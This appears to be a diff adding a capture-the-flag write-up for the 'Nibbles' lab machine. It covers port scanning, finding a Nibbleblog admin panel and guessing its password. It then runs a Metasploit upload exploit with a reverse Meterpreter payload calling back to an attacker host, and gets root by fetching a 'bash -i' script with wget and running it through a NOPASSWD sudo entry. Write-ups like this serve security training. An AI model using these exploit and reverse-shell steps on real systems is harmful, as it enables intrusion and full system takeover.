@@ -1,0 +1,124 @@
+## Enumeration
+
+### Nmap
+
+```bash
+nmap -p 1-65535 -T4 -A -v 10.10.10.75
+```
+
+- `-p 1-65535`: scan all TCP ports
+- `-T4`: faster timing template
+- `-A`: enable OS detection, version detection, script scanning, and traceroute
+- `-v`: verbose output
+
+Only two ports are open:
+
+| Port | Protocol | Service | Version |
+|---|---|---|---|
+| 22 | tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
+| 80 | tcp | http | Apache httpd 2.4.18 (Ubuntu) |
+
+---
+
+### Webserver & Dirbuster
+
+Viewing the source of `index.html` reveals a developer comment referencing a `/nibbleblog/` directory:
+
+```html
+<b>Hello world!</b>
+
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+```
+
+Despite the comment, run a directory brute-force against that path with DirBuster:
+
+```
+Target: http://10.10.10.75:80/nibbleblog/
+```
+
+DirBuster enumerates `index.php`, `feed.php`, and `admin.php` inside `nibbleblog`, revealing a Nibbleblog CMS installation and its admin login panel.
+
+---
+
+## Exploitation
+
+### Nibbleblog
+
+A search finds the Metasploit module `exploit/multi/http/nibbleblog_file_upload`; however, it requires valid credentials. Nibbleblog enforces a login blacklist that blocks repeated failed logins, so brute-forcing is not viable. The valid username can instead be enumerated from the unauthenticated file:
+
+```
+/nibbleblog/content/private/users.xml
+```
+
+With the username known, a single manual guess succeeds: `admin:nibbles`.
+
+Configure and run the Metasploit exploit with these credentials:
+
+```
+use exploit/multi/http/nibbleblog_file_upload
+set RHOSTS 10.10.10.75
+set HttpUsername admin
+set HttpPassword nibbles
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.10.14.10
+set LPORT 4444
+set TARGET 0   # Nibbleblog 4.0.3
+run
+```
+
+```
+[*] Started reverse TCP handler on 10.10.14.10:4444
+[*] Sending stage (37543 bytes) to 10.10.10.75
+[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.75:41846)
+[+] Deleted image.php
+
+meterpreter >
+```
+
+The exploit uploads a malicious image-disguised PHP payload via the plugin's upload functionality, triggers it, and cleans up after itself, returning a Meterpreter session running as the low-privileged web service account (`nibbler`).
+
+---
+
+## Privilege Escalation
+
+### Root
+
+From a shell on the target, check for any `sudo` rights:
+
+```bash
+sudo -l
+```
+
+This reveals a NOPASSWD entry for:
+
+```
+/home/nibbler/personal/stuff/monitor.sh
+```
+
+The file does not exist on the target, so it is possible to supply one. Create a minimal script that spawns an interactive shell:
+
+```bash
+echo "bash -i" > monitor.sh
+```
+
+On the attacker machine, serve the file from a web server, then on the target:
+
+```bash
+id
+# uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+
+wget 10.10.14.10/monitor.sh
+# Saving to: 'monitor.sh'
+
+chmod +x monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+The script executes with root privileges via `sudo`, spawning a root shell:
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+Root access is confirmed. Both flags can now be retrieved from their respective locations on the filesystem.
